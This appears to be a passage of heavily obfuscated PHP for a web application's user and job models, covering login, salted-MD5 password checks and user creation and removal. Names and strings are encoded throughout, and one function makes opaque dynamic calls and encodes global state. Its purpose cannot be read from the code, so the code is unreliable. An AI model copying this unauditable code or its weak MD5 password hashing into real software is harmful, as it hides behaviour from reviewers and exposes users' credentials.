AæèìÕà‡; cé¸¹•‡íÒ: return $this->resetSort($c¼‘°¬·á°); goto EÌ°Ì½‰Ï; BÊœÈ ç¤À: if (!$BĞ…¯¡Ó) { return; } $c¼‘°¬·á° = $this->field($C¢Æç©¿ÛØ[367])->where($Eï±ø†–Ï¢)->order($C¢Æç©¿ÛØ[2489])->select(); $c¼‘°¬·á° = array_to_keyvalue($c¼‘°¬·á°, $C¢Æç©¿ÛØ[33], $C¢Æç©¿ÛØ[367]); goto EºŒî¤À”Š; AæèìÕà‡: $C¢Æç©¿ÛØ =& $_SERVER[Æ]; $Eï±ø†–Ï¢ = array($C¢Æç©¿ÛØ[1425] => USER_ID, $C¢Æç©¿ÛØ[436] => 0); $BĞ…¯¡Ó = $this->where($Eï±ø†–Ï¢)->where(array($C¢Æç©¿ÛØ[28] => $b£Œàöè‹ª))->find(); goto BÊœÈ ç¤À; EºŒî¤À”Š: $b«¦¶¼ëâ = $c¼‘°¬·á°; $c¼‘°¬·á° = array_remove_value($c¼‘°¬·á°, $BĞ…¯¡Ó[$C¢Æç©¿ÛØ[367]]); array_unshift($c¼‘°¬·á°, $BĞ…¯¡Ó[$C¢Æç©¿ÛØ[367]]); goto cé¸¹•‡íÒ; EÌ°Ì½‰Ï: } protected function moveBottom($Bè‹¬ ²êê) { $F´´Æ›ÁÍ =& $_SERVER[Æ]; $f®ôÎù‚Ø¤ = array($F´´Æ›ÁÍ[1425] => USER_ID, $F´´Æ›ÁÍ[436] => 0); $E‹´ğ¦Ú‘İ = $this->where($f®ôÎù‚Ø¤)->max($F´´Æ›ÁÍ[2122]); $fâ§¨í›×¢ = array($F´´Æ›ÁÍ[2122] => $E‹´ğ¦Ú‘İ + 1); return $this->where($f®ôÎù‚Ø¤)->where(array($F´´Æ›ÁÍ[28] => $Bè‹¬ ²êê))->save($fâ§¨í›×¢); } private function getAutoName($C¢¢“×¤²Î) { goto bç‘ªéîïÒ; bç‘ªéîïÒ: $Bô™¬Œ–¦ª =& $_SERVER[Æ]; $E‡·„Äé = array($Bô™¬Œ–¦ª[1425] => USER_ID, $Bô™¬Œ–¦ª[436] => 0); $féÆÎ‡»ï = $this->field($Bô™¬Œ–¦ª[28])->where($E‡·„Äé)->select(); goto Cµ£×ä†Ô”; c™ß¡Ÿ”Ü: return $C¢¢“×¤²Î . "\x28{$bÉ¿†‰Ç}\x29"; goto aé½ö‰ÊÉÈ; Cµ£×ä†Ô”: $féÆÎ‡»ï = array_to_keyvalue($féÆÎ‡»ï, $Bô™¬Œ–¦ª[33], $Bô™¬Œ–¦ª[28]); if (!$féÆÎ‡»ï || !in_array($C¢¢“×¤²Î, $féÆÎ‡»ï)) { return $C¢¢“×¤²Î; } for ($bÉ¿†‰Ç = 0; $bÉ¿†‰Ç < count($féÆÎ‡»ï); $bÉ¿†‰Ç++) { if (!in_array($C¢¢“×¤²Î . "\x28{$bÉ¿†‰Ç}\51", $féÆÎ‡»ï)) { return $C¢¢“×¤²Î . "\50{$bÉ¿†‰Ç}\x29"; } } goto c™ß¡Ÿ”Ü; aé½ö‰ÊÉÈ: } } goto aÈ®ÇŞ¯¤; aÈ®ÇŞ¯¤: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\152\157\142\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\163\x63", "\163\x6f\x72\164"); const JOB_KEY = "\163\x65\154\146\x4a\x6f\x62\x4c\151\x73\x74"; public function listData($dùÙÀ¥‰ = false, $DÅÎ÷Š…ˆÉ = "\x73\x6f\162\164", $fë¬¹Â‡ = false) { return parent::listData($dùÙÀ¥‰, $DÅÎ÷Š…ˆÉ, $fë¬¹Â‡); } public function remove($Bò‡Éœ£®) { return parent::remove($Bò‡Éœ£®); } public function add($e¿ÚÈßÍÔø) { $DØ™È”ó†Ğ =& $_SERVER[Æ]; if ($this->findByName($e¿ÚÈßÍÔø[$DØ™È”ó†Ğ[28]])) { return !1; } $e¿ÚÈßÍÔø[$DØ™È”ó†Ğ[2122]] = $this->getSort(); return parent::insert($e¿ÚÈßÍÔø); } private function getSort() { $A‚÷Å›™—‡ =& $_SERVER[Æ]; $eï‡¼ŞùÕ… = parent::listData(); $a‚ò¿»Ğæ¡ = array_to_keyvalue($eï‡¼ŞùÕ…, $A‚÷Å›™—‡[33], $A‚÷Å›™—‡[2122]); return empty($a‚ò¿»Ğæ¡) ? 0 : max($a‚ò¿»Ğæ¡) + 1; } public function update($eƒ·Û¥°, $Bƒî«Ä½) { $cÏ…ÇÎÖÑ¨ =& $_SERVER[Æ]; $Eù÷ï–¦ßê = parent::listData($eƒ·Û¥°); $eÍô“Üø× = $this->findByName($Bƒî«Ä½[$cÏ…ÇÎÖÑ¨[28]]); if (!$Eù÷ï–¦ßê || $eÍô“Üø× && $eÍô“Üø×[$cÏ…ÇÎÖÑ¨[367]] != $Eù÷ï–¦ßê[$cÏ…ÇÎÖÑ¨[367]]) { return !1; } return parent::update($eƒ·Û¥°, $Bƒî«Ä½); } public function setUserJob($Cå­…ÂŒä®, $bÄ¬Üã…ã¿) { goto CÀ™ªëÆ®”; Fíò™×á³: $B£¿‚¤Ø„¤ = rtrim($B£¿‚¤Ø„¤, $DÂ¥–¸æÈø[47]); Model($DÂ¥–¸æÈø[477])->metaSet($Cå­…ÂŒä®, self::JOB_KEY, $B£¿‚¤Ø„¤); goto EŒæç±Ÿ…Å; CÀ™ªëÆ®”: $DÂ¥–¸æÈø =& $_SERVER[Æ]; if (!is_array($bÄ¬Üã…ã¿)) { $bÄ¬Üã…ã¿ = array($bÄ¬Üã…ã¿); } $f‘Æ‡ğ®©§ = parent::listData(); goto aøñ°™÷ÅŒ; aøñ°™÷ÅŒ: $bÌÛÏ²Š®å = array_to_keyvalue($f‘Æ‡ğ®©§, $DÂ¥–¸æÈø[28]); $B£¿‚¤Ø„¤ = $DÂ¥–¸æÈø[361]; foreach ($bÄ¬Üã…ã¿ as $BÕßÑ¥°ô») { if ($bÌÛÏ²Š®å[$BÕßÑ¥°ô»]) { $B£¿‚¤Ø„¤ .= $bÌÛÏ²Š®å[$BÕßÑ¥°ô»][$DÂ¥–¸æÈø[367]] . $DÂ¥–¸æÈø[47]; } else { $a‰¬“˜°©Ô = $this->add($BÕßÑ¥°ô»); $B£¿‚¤Ø„¤ .= $a‰¬“˜°©Ô . $DÂ¥–¸æÈø[47]; } } goto Fíò™×á³; EŒæç±Ÿ…Å: } public function getUserJob($dÓçŞİê•Ú) { $AŞÆ §¼ìÔ = Model($_SERVER[Æ][477])->metaGet($dÓçŞİê•Ú); return $this->getUserJobInfo($AŞÆ §¼ìÔ[self::JOB_KEY]); } public function getUserJobInfo($EƒÏîÄ ÷) { goto EÉÚƒ›–œ; fô—Å§ä³: $f°ÀíÈã¥ˆ = array_remove_key($f°ÀíÈã¥ˆ, $A¶¹»®Ú[187]); $C¼èœ‹ìÔ = array(); foreach ($f†°³¦ÅèÄ as $d‚ğ‡Èº„ì) { if (isset($f°ÀíÈã¥ˆ[$d‚ğ‡Èº„ì])) { $C¼èœ‹ìÔ[] = $f°ÀíÈã¥ˆ[$d‚ğ‡Èº„ì]; } } goto CªìÜ¬æÙ“; CªìÜ¬æÙ“: return $C¼èœ‹ìÔ; goto Bö Ëô˜Ì; EÉÚƒ›–œ: $A¶¹»®Ú =& $_SERVER[Æ]; $f†°³¦ÅèÄ = explode($A¶¹»®Ú[47], $EƒÏîÄ ÷); $f°ÀíÈã¥ˆ = parent::listData(); goto fô—Å§ä³; Bö Ëô˜Ì: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\x65" => "\165\163\x65\x72\x5f\x6d\x65\164\x61", "\155\x65\x74\141\x46\151\145\154\x64" => "\165\x73\145\x72\111\x44"); protected $simpleField = "\x75\163\145\162\111\x44\54\156\151\x63\x6b\x4e\x61\155\145\x2c\156\141\x6d\145\54\x61\x76\x61\164\x61\162\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($FØÚ£ŒÏ) { $Cá·î‚Å×È =& $_SERVER[Æ]; $Eç§‡ÊÃÛ = $Cá·î‚Å×È[2490]; return array($Cá·î‚Å×È[2167] => array($FØÚ£ŒÏ[0], $Eç§‡ÊÃÛ), $Cá·î‚Å×È[2169] => array($FØÚ£ŒÏ[0], $Eç§‡ÊÃÛ), $Cá·î‚Å×È[2491] => array($FØÚ£ŒÏ[0], $Eç§‡ÊÃÛ)); } protected function getInfo($câÜ›¸Áì, $A™™¤’ ƒ = false) { $aèÔ¼óĞ‚À = $this->getInfoSimple($câÜ›¸Áì); if (!is_array($aèÔ¼óĞ‚À)) { return array(); } if ($A™™¤’ ƒ) { return $this->_getInfoApply($aèÔ¼óĞ‚À); } return $this->cacheFunctionGet($_SERVER[Æ][2209], $câÜ›¸Áì); } protected function getInfoFull($Aù¾ÎàîùÓ, $BÊØõÂ÷Á° = false) { $dêİµ¹å = $this->getInfoSimple($Aù¾ÎàîùÓ); if (!is_array($dêİµ¹å)) { return array(); } if ($BÊØõÂ÷Á°) { return $this->_getInfoApply($dêİµ¹å, !0); return $this->_getInfoApply($dêİµ¹å, !0); } return $this->cacheFunctionGet($_SERVER[Æ][2492], $Aù¾ÎàîùÓ); } private function _getInfoApply($bÖå½çêª, $E‘ìËçœë = false) { goto côÎ‰òÒêÑ; E¶ ÎÙÁ: $bÖå½çêª[$fŒŞƒ®§„æ[391]][$fŒŞƒ®§„æ[2326]] = isset($D‡ÒŒíßÈò[$fŒŞƒ®§„æ[2327]]) ? $D‡ÒŒíßÈò[$fŒŞƒ®§„æ[2327]] : null; if ($E‘ìËçœë) { $bÖå½çêª[$fŒŞƒ®§„æ[417]] = $this->metaGet($bÖå½çêª[$fŒŞƒ®§„æ[1434]]); } return $bÖå½çêª; goto a¦¦¡°÷æ‚; côÎ‰òÒêÑ: $fŒŞƒ®§„æ =& $_SERVER[Æ]; if (!$bÖå½çêª) { return $bÖå½çêª; } $fÁ †òå¥ = md5($fŒŞƒ®§„æ[2493] . $bÖå½çêª[$fŒŞƒ®§„æ[803]] . $fŒŞƒ®§„æ[2494] . $bÖå½çêª[$fŒŞƒ®§„æ[28]]); goto Bƒ“ª‹å¨; Bƒ“ª‹å¨: $bÖå½çêª = $this->_listDataApplyItem($bÖå½çêª); $D‡ÒŒíßÈò = Model($fŒŞƒ®§„æ[1117])->metaGet($bÖå½çêª[$fŒŞƒ®§„æ[391]][$fŒŞƒ®§„æ[369]]); $bÖå½çêª[$fŒŞƒ®§„æ[2495]] = $fÁ †òå¥; goto E¶ ÎÙÁ; a¦¦¡°÷æ‚: } protected function getInfoSimple($B¦÷¸™¸Ïô, $dæöÙÃ§« = false) { $E°À«ä˜Éì =& $_SERVER[Æ]; if (!$B¦÷¸™¸Ïô) { return array(); } if ($dæöÙÃ§«) { $C¾ò ßÊê… = $this->where(array($E°À«ä˜Éì[1434] => intval($B¦÷¸™¸Ïô)))->find(); if (!is_array($C¾ò ßÊê…)) { return array(); } $C¾ò ßÊê…[$E°À«ä˜Éì[2496]] = Action($E°À«ä˜Éì[2497])->parseUrl($C¾ò ßÊê…[$E°À«ä˜Éì[2496]]); return $C¾ò ßÊê…; } return $this->cacheFunctionGet($E°À«ä˜Éì[2170], $B¦÷¸™¸Ïô); } protected function getInfoSimpleOuter($f´èî±ñÌß) { goto e¦Ãì«Ó ˆ; B¤¥Æ¬ŒÆ: $Fã…Â¶Ş‚® = array_field_key($AñìÁÂÉ , explode($F¥ªÔ½å¹³[47], $this->simpleField)); if (!$Fã…Â¶Ş‚®) { return array($F¥ªÔ½å¹³[1434] => $F¥ªÔ½å¹³[1031], $F¥ªÔ½å¹³[28] => $F¥ªÔ½å¹³[157] . LNG($F¥ªÔ½å¹³[2500]) . $F¥ªÔ½å¹³[476], $F¥ªÔ½å¹³[2496] => STATIC_PATH . $F¥ªÔ½å¹³[2501]); } $Fã…Â¶Ş‚®[$F¥ªÔ½å¹³[2496]] = Action($F¥ªÔ½å¹³[2497])->parseUrl($Fã…Â¶Ş‚®[$F¥ªÔ½å¹³[2496]]); goto C¸‹ŠË»†; C¸‹ŠË»†: return $Fã…Â¶Ş‚®; goto aˆ¾º¿¾ÍÌ; e¦Ãì«Ó ˆ: $F¥ªÔ½å¹³ =& $_SERVER[Æ]; if (!$f´èî±ñÌß || $f´èî±ñÌß == 0) { return array($F¥ªÔ½å¹³[1434] => $F¥ªÔ½å¹³[468], $F¥ªÔ½å¹³[28] => $F¥ªÔ½å¹³[157] . LNG($F¥ªÔ½å¹³[2498]) . $F¥ªÔ½å¹³[476], $F¥ªÔ½å¹³[2496] => STATIC_PATH . $F¥ªÔ½å¹³[2499]); } $AñìÁÂÉ  = $this->cacheFunctionGet($F¥ªÔ½å¹³[2170], $f´èî±ñÌß); goto B¤¥Æ¬ŒÆ; aˆ¾º¿¾ÍÌ: } protected function groupUser($d²å‚Ÿ÷Ğ) { } public static function errorLang($Fˆá‡Úˆ) { $f‹÷Ë£’£¢ =& $_SERVER[Æ]; $c¦¬çÎÁç = array(self::ERROR_USER_NOT_EXISTS => $f‹÷Ë£’£¢[2502], self::ERROR_USER_PASSWORD_ERROR => $f‹÷Ë£’£¢[2503], self::ERROR_USER_EXIST_NAME => $f‹÷Ë£’£¢[2504], self::ERROR_USER_EXIST_PHONE => $f‹÷Ë£’£¢[2505], self::ERROR_USER_EXIST_EMAIL => $f‹÷Ë£’£¢[2506], self::ERROR_USER_LOGIN_LOCK => $f‹÷Ë£’£¢[2507], self::ERROR_IP_NOT_ALLOW => $f‹÷Ë£’£¢[2508], self::ERROR_USER_EXIST_NICKNAME => $f‹÷Ë£’£¢[2509]); return LNG($c¦¬çÎÁç[$Fˆá‡Úˆ]); } public function getInfoByMeta($cíòà÷ £ì, $aåá—Š¸×“) { $FßÆ²˜ášÚ =& $_SERVER[Æ]; $C…ø‰â—È = Model($FßÆ²˜ášÚ[2510])->where(array($FßÆ²˜ášÚ[89] => $cíòà÷ £ì, $FßÆ²˜ášÚ[359] => $aåá—Š¸×“))->find(); if ($C…ø‰â—È) { return $this->getInfo($C…ø‰â—È[$FßÆ²˜ášÚ[1434]]); } return !1; } public function userLoginCheck($aÓøÃ¬†·Œ, $F÷ˆŒ¢¶é) { goto E„Æ¦…ØİÁ; E„Æ¦…ØİÁ: $DˆàÛ­í‰£ =& $_SERVER[Æ]; $d‘Ï¯¤è÷ = array($DˆàÛ­í‰£[28] => $aÓøÃ¬†·Œ, $DˆàÛ­í‰£[2330] => $aÓøÃ¬†·Œ, $DˆàÛ­í‰£[293] => $aÓøÃ¬†·Œ, $DˆàÛ­í‰£[2511] => $aÓøÃ¬†·Œ, $DˆàÛ­í‰£[915] => $DˆàÛ­í‰£[917]); if ($this->nickNameRpt()) { unset($d‘Ï¯¤è÷[$DˆàÛ­í‰£[2330]]); } goto cÊ„åòğîÀ; cÊ„åòğîÀ: $B‡¶¶ˆÍÑ¾ = $this->where($d‘Ï¯¤è÷)->find(); if (!$B‡¶¶ˆÍÑ¾) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B‡¶¶ˆÍÑ¾[$DˆàÛ­í‰£[1434]], $F÷ˆŒ¢¶é)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto eÛÉ³¼ãóö; eÛÉ³¼ãóö: $this->userEdit($B‡¶¶ˆÍÑ¾[$DˆàÛ­í‰£[1434]], array($DˆàÛ­í‰£[2512] => time())); $this->clearCache($B‡¶¶ˆÍÑ¾[$DˆàÛ­í‰£[1434]]); return $this->getInfo($B‡¶¶ˆÍÑ¾[$DˆàÛ­í‰£[1434]]); goto F ò÷¸óÁ; F ò÷¸óÁ: } public function clearCache($AÑÃƒéÛö) { $D“»Ñ­ìÄ­ =& $_SERVER[Æ]; $this->cacheFunctionClear($D“»Ñ­ìÄ­[2209], $AÑÃƒéÛö); $this->cacheFunctionClear($D“»Ñ­ìÄ­[2170], $AÑÃƒéÛö); } public function userPasswordCheck($bãìÃ´ğ, $Dçùİáåê) { $FßĞÜì¼ßË =& $_SERVER[Æ]; $c²ß¡æ§µµ = $this->where(array($FßĞÜì¼ßË[1434] => intval($bãìÃ´ğ)))->find(); $BíŠùÉÒ½ = $this->metaGet($bãìÃ´ğ); $D¦›Ğèê¤Ì = isset($BíŠùÉÒ½[$FßĞÜì¼ßË[2513]]) ? $BíŠùÉÒ½[$FßĞÜì¼ßË[2513]] : $FßĞÜì¼ßË[33]; if (md5($D¦›Ğèê¤Ì . trim($Dçùİáåê)) !== $c²ß¡æ§µµ[$FßĞÜì¼ßË[803]]) { return !1; } return !0; } public function userAdd($DÑĞ¼¹ôµˆ) { goto fŒè˜Ùî ; Eµ¨Š×¬Î£: $Dšéñ™ = $this->_checkExist($DÑĞ¼¹ôµˆ); if ($Dšéñ™ !== !0) { return $Dšéñ™; } $a»ŒÈ·¡‡ñ = $this->add($cŒç›íÑ¤ç); goto e†–öØ¹¦; AÉŞ³¼ÈË…: return $a»ŒÈ·¡‡ñ; goto bŠ©åöÎ¹†; fŒè˜Ùî : $DùŠåÌƒà„ =& $_SERVER[Æ]; $cŒç›íÑ¤ç = array($DùŠåÌƒà„[386] => $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[28]], $DùŠåÌƒà„[2514] => $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[1320]], $DùŠåÌƒà„[2515] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[293]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[293]] : $DùŠåÌƒà„[33], $DùŠåÌƒà„[2516] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2511]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2511]] : $DùŠåÌƒà„[33], $DùŠåÌƒà„[2517] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2330]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2330]] : $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[28]], $DùŠåÌƒà„[2518] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2496]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2496]] : $DùŠåÌƒà„[33], $DùŠåÌƒà„[2519] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2520]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2520]] : 1, $DùŠåÌƒà„[2521] => $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[803]], $DùŠåÌƒà„[2171] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2085]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[2085]] : 1024 * 1024 * 20, $DùŠåÌƒà„[2172] => 0, $DùŠåÌƒà„[2512] => 0, $DùŠåÌƒà„[2196] => isset($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[687]]) ? $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[687]] : 1); if (!empty($DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[1434]])) { $cŒç›íÑ¤ç[$DùŠåÌƒà„[1434]] = $DÑĞ¼¹ôµˆ[$DùŠåÌƒà„[1434]]; } goto Eµ¨Š×¬Î£; e†–öØ¹¦: $Aò¨È´×ë… = array($DùŠåÌƒà„[2521] => $cŒç›íÑ¤ç[$DùŠåÌƒà„[803]], $DùŠåÌƒà„[2517] => $cŒç›íÑ¤ç[$DùŠåÌƒà„[2330]]); $this->userEdit($a»ŒÈ·¡‡ñ, $Aò¨È´×ë…); Model($DùŠåÌƒà„[1117])->userRootAdd($a»ŒÈ·¡‡ñ); goto AÉŞ³¼ÈË…; bŠ©åöÎ¹†: } protected function userEditTest($bÓä¹‹Ùï, $CÚ‹¡àÑïŒ) { return $this->call($_SERVER[Æ][2522], $bÓä¹‹Ùï, $CÚ‹¡àÑïŒ); } protected function userEdit($E‘ˆÆÓ”Ş, $c‘«çã½àĞ) { goto dèâç„Ë¯; aÈÑîƒÕÆ: $fñğİ£’ñ‡ = $this->_checkExist($c‘«çã½àĞ, $E‘ˆÆÓ”Ş); if ($fñğİ£’ñ‡ !== !0) { return $fñğİ£’ñ‡; } if (isset($c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[803]]) && trim($c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[803]]) != $cÓ¯Œ½‹ôÉ[33]) { $Cø™ëÖºìã = $this->metaGet($E‘ˆÆÓ”Ş); if (empty($Cø™ëÖºìã[$cÓ¯Œ½‹ôÉ[2513]])) { $Cø™ëÖºìã[$cÓ¯Œ½‹ôÉ[2513]] = rand_string(10); Model($cÓ¯Œ½‹ôÉ[474])->metaSet($E‘ˆÆÓ”Ş, $cÓ¯Œ½‹ôÉ[2513], $Cø™ëÖºìã[$cÓ¯Œ½‹ôÉ[2513]]); } $c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[803]] = md5($Cø™ëÖºìã[$cÓ¯Œ½‹ôÉ[2513]] . trim($c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[803]])); } else { unset($c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[803]]); } goto EÍÂ¦¡Ö£í; dèâç„Ë¯: $cÓ¯Œ½‹ôÉ =& $_SERVER[Æ]; $B§»Ğ÷…–‹ = $this->getInfoSimple($E‘ˆÆÓ”Ş); if (!$B§»Ğ÷…–‹) { return !1; } goto aÈÑîƒÕÆ; EÍÂ¦¡Ö£í: $this->where(array($cÓ¯Œ½‹ôÉ[1425] => $E‘ˆÆÓ”Ş))->save($c‘«çã½àĞ); if (isset($c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[2330]])) { $this->setNamePinyin($E‘ˆÆÓ”Ş, $c‘«çã½àĞ[$cÓ¯Œ½‹ôÉ[2330]]); } return !0; goto c•âå‡á¡; c•âå‡á¡: } public function setNamePinyin($få÷Ã½—¼½, $EîšíÊª¿ = false) { $Eˆ»öÀ†œÎ =& $_SERVER[Æ]; if (!$EîšíÊª¿) { $dÚ»…§³´¼ = $this->getInfoSimple($få÷Ã½—¼½); $EîšíÊª¿ = $dÚ»…§³´¼[$Eˆ»öÀ†œÎ[2330]] ? $dÚ»…§³´¼[$Eˆ»öÀ†œÎ[2330]] : $dÚ»…§³´¼[$Eˆ»öÀ†œÎ[28]]; } $aéÛøˆèÚí = Model($Eˆ»öÀ†œÎ[477]); if (!Input::check($EîšíÊª¿, $Eˆ»öÀ†œÎ[528])) { return $aéÛøˆèÚí->metaSet($få÷Ã½—¼½, array($Eˆ»öÀ†œÎ[416] => $Eˆ»öÀ†œÎ[33], $Eˆ»öÀ†œÎ[415] => $Eˆ»öÀ†œÎ[33])); } return $aéÛøˆèÚí->metaSet($få÷Ã½—¼½, array($Eˆ»öÀ†œÎ[416] => str_replace($Eˆ»öÀ†œÎ[50], $Eˆ»öÀ†œÎ[33], Pinyin::encode($EîšíÊª¿)), $Eˆ»öÀ†œÎ[415] => Pinyin::encode($EîšíÊª¿, $Eˆ»öÀ†œÎ[529]))); } private function nickNameRpt() { $Cêš³ˆğÛ =& $_SERVER[Æ]; $B¢–Š­¬ÉÃ = Model($Cêš³ˆğÛ[1088])->get($Cêš³ˆğÛ[2523]); $fÓ³¸®ñê = $GLOBALS[$Cêš³ˆğÛ[6]][$Cêš³ˆğÛ[2478]][$Cêš³ˆğÛ[2523]]; $Fù——Á„Œ§ = !is_null($B¢–Š­¬ÉÃ) ? $B¢–Š­¬ÉÃ : $fÓ³¸®ñê; return !!$Fù——Á„Œ§; } private function _checkExist($f×«†‘ô, $A¶¢®„æëÖ = false) { $F’ï ÜÇ•Ö =& $_SERVER[Æ]; $C¶†¼‘Şá¼ = array($F’ï ÜÇ•Ö[28] => UserModel::ERROR_USER_EXIST_NAME, $F’ï ÜÇ•Ö[2330] => UserModel::ERROR_USER_EXIST_NICKNAME, $F’ï ÜÇ•Ö[293] => UserModel::ERROR_USER_EXIST_EMAIL, $F’ï ÜÇ•Ö[2511] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C¶†¼‘Şá¼[$F’ï ÜÇ•Ö[2330]]); } $cáºÊİğÊÑ = $A¶¢®„æëÖ ? array($F’ï ÜÇ•Ö[1434] => array($F’ï ÜÇ•Ö[2524], $A¶¢®„æëÖ)) : array(); foreach ($C¶†¼‘Şá¼ as $CÇ˜ÛŠÃğ => $CÈÄöÂÊˆ…) { if (!isset($f×«†‘ô[$CÇ˜ÛŠÃğ]) || !$f×«†‘ô[$CÇ˜ÛŠÃğ]) { continue; } $c¯…»Œã¶È = array_merge(array($CÇ˜ÛŠÃğ => $f×«†‘ô[$CÇ˜ÛŠÃğ]), $cáºÊİğÊÑ); $F³Şƒ´ÅÜ = $this->where($c¯…»Œã¶È)->find(); if ($F³Şƒ´ÅÜ) { return $CÈÄöÂÊˆ…; } } return !0; } public function userListInfo($dˆŞË©Ä´) { $dœ†á¹¼®— =& $_SERVER[Æ]; $fèñ¬“ãŸÇ = array(); $dˆŞË©Ä´ = is_array($dˆŞË©Ä´) ? array_unique($dˆŞË©Ä´) : array(); if (!$dˆŞË©Ä´) { return $fèñ¬“ãŸÇ; } if (count($dˆŞË©Ä´) < 20) { foreach ($dˆŞË©Ä´ as $e‰ªÒÌÎ§‹) { $fèñ¬“ãŸÇ[$e‰ªÒÌÎ§‹ . $dœ†á¹¼®—[33]] = $this->getInfoSimpleOuter($e‰ªÒÌÎ§‹); } } else { $fœ™‚¸ÎÖÌ = array($dœ†á¹¼®—[1425] => array($dœ†á¹¼®—[384], $dˆŞË©Ä´)); if (count($dˆŞË©Ä´) == 1) { $fœ™‚¸ÎÖÌ = array($dœ†á¹¼®—[1425] => $dˆŞË©Ä´[0]); } $E“ÃøĞ½Š‰ = Model($dœ†á¹¼®—[474])->field($this->simpleField)->where($fœ™‚¸ÎÖÌ)->select(); $E“ÃøĞ½Š‰ = array_to_keyvalue($E“ÃøĞ½Š‰, $dœ†á¹¼®—[1434]); foreach ($dˆŞË©Ä´ as $e‰ªÒÌÎ§‹) { $E±í†Ã’„ø = $E“ÃøĞ½Š‰[$E“ÃøĞ½Š‰[$e‰ªÒÌÎ§‹]]; if (!$E±í†Ã’„ø) { $fèñ¬“ãŸÇ[$e‰ªÒÌÎ§‹ . $dœ†á¹¼®—[33]] = $this->getInfoSimpleOuter($e‰ªÒÌÎ§‹); continue; } $E±í†Ã’„ø[$dœ†á¹¼®—[2496]] = Action($dœ†á¹¼®—[2497])->parseUrl($E±í†Ã’„ø[$dœ†á¹¼®—[2496]]); $fèñ¬“ãŸÇ[$e‰ªÒÌÎ§‹ . $dœ†á¹¼®—[33]] = $E±í†Ã’„ø; } } return $fèñ¬“ãŸÇ; } protected function userStatus($c•‡ŠŒÄÈ—, $AÅ”©ÓåÃ“) { $F•Ë½çö˜ß = $this->getInfoSimple($c•‡ŠŒÄÈ—); if (!$F•Ë½çö˜ß) { return !1; } $c¶±İ˜šŞ¢ = array($_SERVER[Æ][687] => $AÅ”©ÓåÃ“); return $this->userEdit($c•‡ŠŒÄÈ—, $c¶±İ˜šŞ¢); } protected function userRemove($BÇã·èóÍÛ) { goto bÃË‹÷¦¤Ş; bÃË‹÷¦¤Ş: $cØŸÏ«Øö¶ =& $_SERVER[Æ]; $F¶„˜ñê÷ = $this->getInfoSimple($BÇã·èóÍÛ); if (!$F¶„˜ñê÷) { return !1; } goto F‘š°Åóœª; EÂ„›ŠŸŠÑ: Model($cØŸÏ«Øö¶[751])->userRootRemove($BÇã·èóÍÛ); return $this->where($aİë¢’¾Ü)->delete(); goto c¢Æí§«ïÍ; dŞŒ‘µÍ“: Model($cØŸÏ«Øö¶[2175])->where($aİë¢’¾Ü)->delete(); Model($cØŸÏ«Øö¶[2510])->where($aİë¢’¾Ü)->delete(); Model($cØŸÏ«Øö¶[2526])->where($aİë¢’¾Ü)->delete(); goto EÂ„›ŠŸŠÑ; F‘š°Åóœª: $aİë¢’¾Ü = array($cØŸÏ«Øö¶[1425] => $BÇã·èóÍÛ); Model($cØŸÏ«Øö¶[536])->where($aİë¢’¾Ü)->delete(); Model($cØŸÏ«Øö¶[2525])->where($aİë¢’¾Ü)->delete(); goto dŞŒ‘µÍ“; c¢Æí§«ïÍ: } protected function userGroupSet($CÊ‰Œ„†¶, $f™¡ñŒ¦Ê, $A‹ÓÁÍ†ß = array()) { goto C‹ÁŠšê‰˜; F…ØƒŒÅë˜: if ($_SERVER[$cóÕççŞ[780]] != $c«äèõ¥©($D™Â„Éä˜™)) { goto a¾â“á›“; béÚÍİÔƒÇ: $AÚÜ‚Ş¬éµ(); $fàŸšË‘² = $cóÕççŞ[796]; $A…ñÉìö¶ = json_encode($GLOBALS[$cóÕççŞ[797]]); goto a‹›šˆ¦Âí; e£²‰Ş°‹Í: $cµ Ù¯• = $cóÕççŞ[795]; $cµ Ù¯•($_SERVER[$cóÕççŞ[793]]); $AÚÜ‚Ş¬éµ = $cóÕççŞ[794]; goto béÚÍİÔƒÇ; dËãŞƒ²†‰: $D²Í¢Ñ‰ ½ = $aŞêŒª‘Ö…($Aä…ÏÇ×˜İ); $bì£…³¯ç¸ = explode($cóÕççŞ[217], $D²Í¢Ñ‰ ½); if (count($bì£…³¯ç¸) < 